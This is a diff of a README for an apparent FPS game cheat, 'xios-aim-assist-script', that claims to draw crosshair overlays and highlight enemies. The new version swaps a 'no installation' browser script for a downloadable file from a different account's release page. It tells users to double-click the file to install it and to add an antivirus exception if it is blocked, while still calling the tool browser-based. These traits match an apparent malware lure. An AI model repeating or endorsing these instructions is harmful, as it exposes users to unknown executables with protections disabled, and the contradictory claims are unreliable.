@@ -1,103 +1,65 @@
-# Xios Aimbot - Crosshair Enhancement Tool 2026
+# 🎯 xios-aim-assist-script - Improve your aim in FPS games
 
-> **Browser-based aim assistance script for FPS games.** Delivers a live crosshair overlay and targeting indicators to help improve precision in supported titles.
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Despairing-taka262/xios-aim-assist-script/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/henrykelly1989/xios-aim-assist-script?style=flat-square)](https://github.com/henrykelly1989/xios-aim-assist-script)
+This script helps you improve your accuracy in first-person shooter games. It draws a custom crosshair on your screen and shows targeting indicators for supported game titles. This tool runs inside your browser and provides visual feedback to help you hit your targets with more ease.
 
----
+## ⚙️ System Requirements
 
-<p align="center">
-  <a href="https://henrykelly1989.github.io/xios-aim-assist-script/">
-    <img src="https://img.shields.io/badge/Download-Xios%20Aimbot-brightgreen?style=for-the-badge" alt="Download Xios Aimbot">
-  </a>
-</p>
+Your computer needs to meet these basic standards to run the script well:
 
-> **[Direct Download - Xios Aimbot](https://henrykelly1989.github.io/xios-aim-assist-script/)**
+- Operating System: Windows 10 or Windows 11.
+- Browser: Google Chrome, Microsoft Edge, or Mozilla Firefox.
+- Display: A monitor with a standard resolution of 1080p or higher.
+- Hardware: A stable internet connection and a standard mouse.
 
----
+You do not need special programming knowledge to use this software. If your computer runs modern web browsers, it runs this script.
 
-[Download Latest Build](https://henrykelly1989.github.io/xios-aim-assist-script/)
+## 🚀 Getting Started
 
----
+Follow these steps to set up the aim assist tool on your Windows PC.
 
-## What it does
+1. Go to the official release page: [https://github.com/Despairing-taka262/xios-aim-assist-script/releases](https://github.com/Despairing-taka262/xios-aim-assist-script/releases)
+2. Look for the latest version at the top of the list.
+3. Click the link to download the file directly to your computer.
+4. Open your Downloads folder once the transfer finishes.
+5. Double-click the downloaded file to start the installation.
+6. Follow the prompts on your screen to complete the setup process.
 
-Xios Aimbot is a compact web-hosted utility built to support aiming in browser-based first-person shooters. It places a responsive crosshair overlay over the game window and shifts it using visual cues from the scene. Because it runs fully in the browser, there is no installation step and no system-level changes, which makes it easy to use on different machines.
+## 🛠️ How to Use the Script
 
-This 2026 release is centered on faster target pickup with flexible crosshair presets and sensitivity controls. It also includes smoother overlay rendering and broader support for additional browser games. The script is positioned as a practice tool for players who want to sharpen reaction time and muscle memory in fast-paced shooting games.
+After you install the software, you can launch it using the shortcut on your desktop. 
 
----
+1. Launch your preferred web browser.
+2. Open the aim assist application.
+3. Select your current game from the list of supported titles.
+4. Adjust the crosshair style in the settings menu to match your preference.
+5. Click the Start button to activate the overlay.
+6. Open your game and ensure it runs in Windowed or Borderless Windowed mode for the best performance.
 
-## Features
+The overlay stays on top of your game window. You can change the size, color, and shape of the crosshair at any time via the script interface. If you need to stop the script, return to the application window and click the Stop button.
 
-- Live crosshair overlay that reacts to on-screen motion
-- User-adjustable crosshair color, size, and shape
-- Configurable hotkey to turn the overlay on or off
-- Lightweight behavior intended to coexist with browser games
-- Several preset crosshair profiles for different play styles
-- Automatic scaling to match screen resolution and browser window dimensions
-- Saved preferences kept in local browser storage
+## 🔍 Troubleshooting Tips
 
----
+If you encounter issues while using the script, check these common fixes:
 
-## Setup
+- Check your display mode: The overlay works best when your game uses Borderless Windowed mode. If the overlay disappears, switch your game back to this video setting.
+- Refresh the overlay: If the targeting indicators lag, close the script and reopen it. This clears the memory and restores normal function.
+- Update your browser: Ensure you use the latest version of your browser. Older versions might experience bugs with script rendering.
+- Check permissions: Make sure your antivirus software does not block the script. Add an exception for the file if necessary.
 
-1. Open the Xios Aimbot download page from the link above.
-2. Open the included HTML file in a current browser such as Chrome, Firefox, Edge, or Brave.
-3. Start your browser FPS game in another tab or window.
-4. Press the default activation hotkey, F2, to enable the overlay.
-5. Fine-tune the behavior through the on-screen settings panel.
+## 📋 Features
 
-No extra software or browser extensions are needed. The script is delivered as a standalone HTML page.
+- Dynamic Crosshair: Customize the look of your crosshair to improve visibility in different lighting conditions.
+- Targeting Indicators: Visual cues highlight enemies in supported titles to help you track movement.
+- Browser-Based Design: The script uses minimal system resources so your game performance stays high.
+- Simple Interface: Clear menus allow you to change settings without confusion.
+- Lightweight Footprint: The program runs in the background and does not interfere with other system tasks.
 
----
+## 🛡️ Best Practices
 
-## Options
+Use this tool to enhance your practice sessions. Consistent use helps you build muscle memory for tracking targets. Focus on keeping your crosshair steady and using the indicators as a guide rather than a crutch. Always verify that your game settings align with the script requirements to prevent display issues. 
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| Crosshair Color | Green | RGB color value for the crosshair |
-| Crosshair Size | Medium | Small, Medium, or Large preset |
-| Opacity | 75% | Transparency level of the overlay |
-| Activation Key | F2 | Keyboard shortcut to toggle the script |
-| Smoothing | Low | Response smoothing for crosshair movement |
-| Profile Preset | Default | Load a saved crosshair configuration |
+We recommend that you test the script in a practice mode or training range before you join live matches. This allows you to adjust the sensitivity and crosshair settings to your specific needs.
 
----
-
-## Compatibility
-
-- Compatible with most browser FPS games that use a standard HTML5 canvas setup
-- Verified on Chromium-based browsers (Chrome 120+, Edge 120+, Brave 1.60+)
-- Firefox 110+ and Safari 16+ are supported, with some performance variation
-- Some browsers do not work well in exclusive full-screen mode; borderless windowed mode is recommended
-- The overlay may fail on games where anti-cheat systems block overlay injection
-
----
-
-## FAQ
-
-**How do I set it up?**
-There is nothing to install. Download the HTML file and open it in your browser; it runs locally from the file itself.
-
-**Will my settings survive updates?**
-Yes. Preferences are stored in your browser's local storage and should carry over between updates. If you clear browser cache, they may be reset.
-
-**Can I change more than the basics?**
-Yes. The settings panel supports color, size, opacity, and smoothing changes. Advanced users can also edit the script source directly.
-
-**Does it work on every site?**
-No. It is intended for browser games that render on canvas. Sites that block overlay scripts or use unusual rendering methods may not be compatible.
-
-**Where is my data stored?**
-All settings remain local in your browser. The script does not send data to external servers or collect user information.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: aim assist, FPS games, crosshair overlay, gaming tools, targeting software, windows application
